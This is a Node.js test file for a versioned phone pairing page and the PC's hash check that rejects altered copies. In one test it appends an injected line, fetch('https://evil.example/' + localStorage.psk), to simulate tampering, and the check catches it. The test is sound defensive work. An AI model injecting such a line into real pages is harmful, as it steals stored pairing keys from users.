/**
 * The phone page a pairing code opens, and the PC's check of it
 * (apaki/scripts/build-web.mjs release/expected, apaki/engine/remote-page.js):
 * a published version lives at its own path and never changes; the PC builds
 * the version it expects and only an exact match on the site passes.
 */

import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { expected, release, serve, versionsOf } from '../apaki/scripts/build-web.mjs';
import { checkPage, pageText, pageUrl } from '../apaki/engine/remote-page.js';

const RELAY = 'wss://relay.example';

test('a release lives at /v/<version>/ with its file hashes, and a published version never changes', () => {
  const site = fs.mkdtempSync(path.join(os.tmpdir(), 'apaki-site-'));
  try {
    // The site's front page is the product's home page (2026-10-12): a release never rewrites it.
    const home = '<!doctype html><title>home</title>\n';
    fs.writeFileSync(path.join(site, 'index.html'), home);
    const r = release({ relay: RELAY, site });
    const dir = path.join(site, 'v', r.version);
    const manifest = JSON.parse(fs.readFileSync(path.join(dir, 'manifest.json'), 'utf8'));
    assert.equal(manifest.version, r.version);
    assert.equal(manifest.relay, RELAY);
    assert.ok(manifest.files['index.html'] && manifest.files['boot.js'] && manifest.files['sw.js']);
    assert.equal(fs.readFileSync(path.join(site, 'index.html'), 'utf8'), home, 'the front page is left alone');
    const app = fs.readFileSync(path.join(site, 'app', 'index.html'), 'utf8');
    assert.ok(app.includes(`href="../v/${r.version}/"`), 'the web app page opens the newest version');
    assert.ok(app.includes(`../v/${r.version}/manifest.json`), 'the web app page lists the version with its hashes');
    assert.deepEqual(versionsOf(site).map((v) => v.version), [r.version]);
    // The PC's own build is the same version, file for file.
    const e = expected({ relay: RELAY });
    assert.equal(e.version, r.version);
    assert.deepEqual(e.files, manifest.files);
    // Publishing again is fine; a changed copy is refused.
    assert.equal(release({ relay: RELAY, site }).version, r.version);
    fs.appendFileSync(path.join(dir, 'boot.js'), '\n// changed');
    assert.throws(() => release({ relay: RELAY, site }), /never changes/);
  } finally { fs.rmSync(site, { recursive: true, force: true }); }
});

test('a fresh site folder (a self-hosted relay) gets a small front page that points at the web app', () => {
  const site = fs.mkdtempSync(path.join(os.tmpdir(), 'apaki-site-'));
  try {
    release({ relay: RELAY, site });
    assert.match(fs.readFileSync(path.join(site, 'index.html'), 'utf8'), /href="app\/"/);
    assert.ok(fs.existsSync(path.join(site, 'app', 'index.html')));
  } finally { fs.rmSync(site, { recursive: true, force: true }); }
});

test('the PC check: an exact copy passes, a changed or missing file does not, no site is unreachable', async () => {
  const site = fs.mkdtempSync(path.join(os.tmpdir(), 'apaki-site-'));
  const r = release({ relay: RELAY, site });
  const server = await serve(site, 0, { log: () => {} });
  const web = `http://127.0.0.1:${server.address().port}/`;
  try {
    const ok = await checkPage({ web, relay: RELAY });
    assert.equal(ok.state, 'ok', JSON.stringify(ok));
    assert.equal(ok.url, `${web}v/${r.version}/`);
    assert.equal(ok.url, pageUrl(web.slice(0, -1), r.version), 'with or without the trailing slash');
    assert.match(pageText(ok), /serves exactly the page this Apaki builds/);

    fs.appendFileSync(path.join(site, 'v', r.version, 'app.js'), '\nfetch("https://evil.example/" + localStorage.psk);');
    const bad = await checkPage({ web, relay: RELAY });
    assert.equal(bad.state, 'differs');
    assert.deepEqual(bad.differs, ['app.js']);
    assert.match(pageText(bad), /will not show a pairing code/);

    fs.rmSync(path.join(site, 'v', r.version, 'wire.js'));
    assert.equal((await checkPage({ web, relay: RELAY })).state, 'differs', 'a file gone from a version is not that version');

    const other = await checkPage({ web, relay: 'wss://other-relay.example' });
    assert.equal(other.state, 'missing', 'a version this site never published');
    assert.match(pageText(other), /not published/);
  } finally {
    await new Promise((r2) => server.close(r2));
    fs.rmSync(site, { recursive: true, force: true });
  }
  const gone = await checkPage({ web: 'http://127.0.0.1:9/', relay: RELAY, timeoutMs: 2000 });
  assert.equal(gone.state, 'unreachable');
});
